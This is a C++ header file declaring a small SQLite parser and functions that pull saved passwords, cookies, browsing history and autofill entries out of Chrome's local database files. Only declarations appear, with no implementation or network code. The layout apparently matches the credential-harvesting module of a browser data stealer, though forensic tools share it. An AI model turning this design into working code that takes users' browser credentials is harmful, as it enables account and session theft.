#pragma once

#include <string>
#include <vector>
#include <tuple>
#include <cstdint>

class MinimalSQLiteReader {
public:
    bool LoadDatabase(const std::wstring& path);
    bool FindTableRootPage(const std::string& tableName, uint32_t& rootPage);
    std::vector<std::vector<std::vector<uint8_t>>> ExtractTable(uint32_t rootPage);

private:
    std::vector<uint8_t> database;
    uint16_t page_size;

    void ParseBTreePage(uint32_t pageNum, std::vector<std::vector<std::vector<uint8_t>>>& rows);
    std::vector<std::vector<uint8_t>> ParseCell(uint32_t offset);
    int ReadVarint(uint32_t offset, uint64_t& value);
};

// ==== Chrome-specific extractors ====

std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>>>
ExtractChromePasswordsMinimal(const std::wstring& loginDataPath);

std::vector<std::tuple<std::string, std::string, std::string>>
ExtractChromeCookiesMinimal(const std::wstring& cookieDbPath);

std::vector<std::tuple<std::string, int>>
ExtractChromeHistoryMinimal(const std::wstring& historyDbPath);

std::vector<std::tuple<std::string, std::string>>
ExtractChromeAutofillMinimal(const std::wstring& webDataPath);
